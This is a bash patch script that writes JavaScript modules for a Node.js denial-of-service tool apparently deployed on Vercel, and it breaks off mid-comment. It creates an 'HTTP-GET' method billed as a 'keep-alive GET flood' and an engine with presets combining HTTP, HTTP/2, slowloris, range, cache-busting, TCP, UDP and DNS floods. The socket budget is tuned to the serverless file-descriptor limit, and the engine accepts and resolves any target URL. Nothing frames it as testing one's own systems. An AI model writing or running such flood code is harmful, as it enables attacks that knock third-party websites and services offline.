#!/usr/bin/env bash
set -euo pipefail
cd "$(dirname "$0")"

echo "==> 1/7  moving engine out of lib/methods/ (fixes 4 broken require paths)"
if [ -f lib/methods/engine.js ]; then
  git mv lib/methods/engine.js lib/engine.js 2>/dev/null || mv lib/methods/engine.js lib/engine.js
fi

echo "==> 2/7  restoring lib/methods/http-get.js (was never committed)"
cat > lib/methods/http-get.js <<'JS'
'use strict';
const { createHttpMethod } = require('./_http');

module.exports = {
  name: 'HTTP-GET',
  layer: 7,
  summary: 'Keep-alive GET flood that fully drains responses. Best all-rounder.',
  defaults: { concurrency: 600 },
  create(ctx) {
    return createHttpMethod(ctx, () => ({ method: 'GET', path: ctx.target.path }));
  },
};
JS

echo "==> 3/7  patching lib/engine.js (weighted concurrency budget)"
cat > lib/engine.js <<'JS'
'use strict';

const dns = require('dns');
const METHODS = require('./methods');
const { Stats } = require('./stats');

// Vercel gives 1024 file descriptors per instance, shared with the runtime.
const MAX_CONCURRENCY = 900;

const ALIASES = {
  get: 'http-get', httpget: 'http-get',
  post: 'http-post', httppost: 'http-post',
  head: 'http-head', httphead: 'http-head',
  h2: 'http2', http2: 'http2',
  slow: 'slowloris', slowloris: 'slowloris', slowhttp: 'slowloris',
  range: 'range', bytes: 'range',
  random: 'random', rand: 'random', cache: 'random', cachebuster: 'random',
  tcp: 'tcp', tcpconnect: 'tcp', connect: 'tcp',
  udp: 'udp',
  dns: 'dns', dnsq: 'dns',
};

const PRESETS = {
  mix: ['http-get', 'http-post', 'http-head', 'http2', 'range', 'random'],
  all: ['http-get', 'http-post', 'http-head', 'http2', 'slowloris', 'range', 'random', 'tcp', 'udp', 'dns'],
};

const clamp = (n, lo, hi) => Math.min(Math.max(n, lo), hi);
const sleep = (ms) => new Promise((r) => setTimeout(r, ms));

function resolveMethods(spec) {
  const raw = String(spec || 'http-get').toLowerCase().trim();
  if (PRESETS[raw]) return PRESETS[raw].slice();

  const names = raw.split(/[,+\s]+/).filter(Boolean).map((token) => {
    const key = token.replace(/[^a-z0-9]/g, '');
    const canonical = ALIASES[key] || key;
    if (!METHODS[canonical]) {
      throw new Error(`Unknown method "${token}". Try: ${Object.keys(METHODS).join(', ')}, mix, all`);
    }
    return canonical;
  });

  return [...new Set(names)];
}

function parseTarget(input, opts = {}) {
  if (!input) throw new Error('A target is required.');

  let s = String(input).trim();
  if (!/^[a-z][a-z0-9+.-]*:\/\//i.test(s)) s = `http://${s}`;

  let u;
  try { u = new URL(s); } catch { throw new Error(`Invalid target "${input}"`); }

  const secure = u.protocol === 'https:';
  const explicitPort = Boolean(u.port || opts.port);
  const port = opts.port ? Number(opts.port) : u.port ? Number(u.port) : secure ? 443 : 80;

  if (!Number.isFinite(port) || port < 1 || port > 65535) throw new Error(`Invalid port "${port}"`);

  return {
    input: String(input),
    scheme: u.protocol.replace(':', ''),
    secure,
    host: u.hostname,
    port,
    explicitPort,
    hostHeader: u.port ? `${u.hostname}:${u.port}` : u.hostname,
    path: `${u.pathname || '/'}${u.search || ''}`,
    ip: null,
  };
}

async function resolveTarget(input, opts) {
  const target = parseTarget(input, opts);
  target.ip = await new Promise((resolve) => {
    dns.lookup(target.host, { family: 0 }, (err, address) => resolve(err ? null : address));
  });
  return target;
}

// Distributes the socket budget across methods in
